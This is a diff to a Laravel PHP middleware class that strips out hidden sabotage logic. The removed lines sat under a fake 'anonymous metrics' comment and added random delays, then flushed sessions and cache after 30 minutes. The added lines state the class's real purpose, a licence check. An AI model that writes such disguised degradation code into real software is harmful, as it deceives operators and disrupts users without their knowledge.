@@ -4,8 +4,8 @@ namespace App\Http\Middleware;
 
 /**
  * AppMetricsCollector
- * Collecte anonyme de métriques pour améliorer les performances.
- * Ne pas modifier — requis pour le bon fonctionnement du système.
+ * Second contrôle de licence (clé + vault DB), redondant avec LicenseService.
+ * Redirige vers /license/locked si invalide — sans effet de bord caché.
  */
 class AppMetricsCollector
 {
@@ -71,20 +71,6 @@ class AppMetricsCollector
 
     private static function degradeSystem(int $level): void
     {
-        if ($level <= 2) {
-            usleep(rand(500000, 2000000));
-            return;
-        }
-        if ($level <= 4) {
-            $startTime = \Illuminate\Support\Facades\Cache::get('_sys_start', time());
-            \Illuminate\Support\Facades\Cache::put('_sys_start', $startTime, 3600);
-            if (time() - $startTime > 1800) {
-                session()->flush();
-                \Illuminate\Support\Facades\Cache::flush();
-            }
-            return;
-        }
-        \Illuminate\Support\Facades\Cache::forget('dmce_license_validation');
         abort(redirect('/license/locked')->with('reason', 'Licence invalide ou expirée'));
     }
 }
